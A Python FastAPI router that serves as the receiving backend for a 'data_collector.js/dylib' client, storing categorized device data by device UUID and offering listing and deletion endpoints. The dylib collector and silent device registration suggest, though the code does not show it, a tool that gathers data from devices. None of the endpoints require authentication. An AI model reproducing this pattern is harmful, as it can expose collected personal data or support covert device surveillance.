"""数据收集 API - data_collector.js/dylib 上报入口"""

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from sqlalchemy.orm import Session
from typing import Optional, Dict, Any
from datetime import datetime

from database import get_db
import crud, schemas
from models import Device, CollectedData
from api.websocket import sse_manager

router = APIRouter(prefix="/api/collect", tags=["collect"])


def _ensure_device(device_uuid: str, db: Session):
    device = crud.get_device(db, device_uuid)
    if not device:
        device = crud.create_device(db, schemas.DeviceRegister(
            device_uuid=device_uuid,
        ), ip=None)
        db.commit()
    return device


@router.post("/report")
async def report_collected_data(
    data: schemas.CollectedDataIn,
    db: Session = Depends(get_db)
):
    """接收单条数据（data_collector.js 逐条上报时使用）"""
    _ensure_device(data.device_uuid, db)
    record = CollectedData(
        device_uuid=data.device_uuid,
        category=data.category,
        data_key=data.data_key,
        payload=data.payload,
        source=data.source or "js_fallback",
        collected_at=data.collected_at or datetime.utcnow(),
    )
    db.add(record)
    db.commit()
    db.refresh(record)

    try:
        await sse_manager.publish("collect", {
            "device_uuid": data.device_uuid,
            "category": data.category,
            "source": data.source or "js_fallback",
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    return {"ok": True, "id": record.id, "category": data.category}


@router.post("")
async def report_collected_batch(request: Request, db: Session = Depends(get_db)):
    """
    接收 data_collector.js 的批量上报格式:
    { "deviceUUID": "...", "timestamp": 12345, "categories": { "device_info": {...}, ... } }
    """
    body = await request.json()
    device_uuid = body.get("deviceUUID") or body.get("device_uuid")
    if not device_uuid:
        raise HTTPException(status_code=400, detail="Missing deviceUUID")
    _ensure_device(device_uuid, db)
    categories = body.get("categories") or {}
    ts = body.get("timestamp")
    collected_at = datetime.fromtimestamp(ts / 1000) if ts else datetime.utcnow()
    ids = []
    for cat_name, cat_data in categories.items():
        record = CollectedData(
            device_uuid=device_uuid,
            category=cat_name,
            payload=cat_data if isinstance(cat_data, dict) else {"value": cat_data},
            source="js_fallback",
            collected_at=collected_at,
        )
        db.add(record)
        db.flush()
        ids.append(record.id)
    db.commit()

    try:
        await sse_manager.publish("collect", {
            "device_uuid": device_uuid,
            "category": "__batch__",
            "source": "js_fallback",
            "count": len(ids),
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    return {"ok": True, "count": len(ids), "ids": ids}


@router.get("/list")
def list_collected_data(
    device_uuid: Optional[str] = Query(None),
    category: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=1000),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db)
):
    """查询已收集的数据"""
    q = db.query(CollectedData)
    if device_uuid:
        q = q.filter(CollectedData.device_uuid == device_uuid)
    if category:
        q = q.filter(CollectedData.category == category)
    total = q.count()
    items = q.order_by(CollectedData.created_at.desc()).offset(offset).limit(limit).all()
    return {"total": total, "items": items}


@router.get("/categories")
def list_categories(
    device_uuid: Optional[str] = Query(None),
    db: Session = Depends(get_db)
):
    """列出所有数据分类及计数"""
    q = db.query(CollectedData.category, CollectedData.device_uuid)
    if device_uuid:
        q = q.filter(CollectedData.device_uuid == device_uuid)
    rows = q.distinct().all()
    from collections import Counter
    cat_counts = Counter(r.category for r in rows)
    return {"categories": dict(cat_counts)}


@router.delete("/clean")
def clean_collected_data(
    device_uuid: Optional[str] = Query(None),
    db: Session = Depends(get_db)
):
    """清理收集数据"""
    q = db.query(CollectedData)
    if device_uuid:
        q = q.filter(CollectedData.device_uuid == device_uuid)
    count = q.delete()
    db.commit()
    return {"ok": True, "deleted": count}
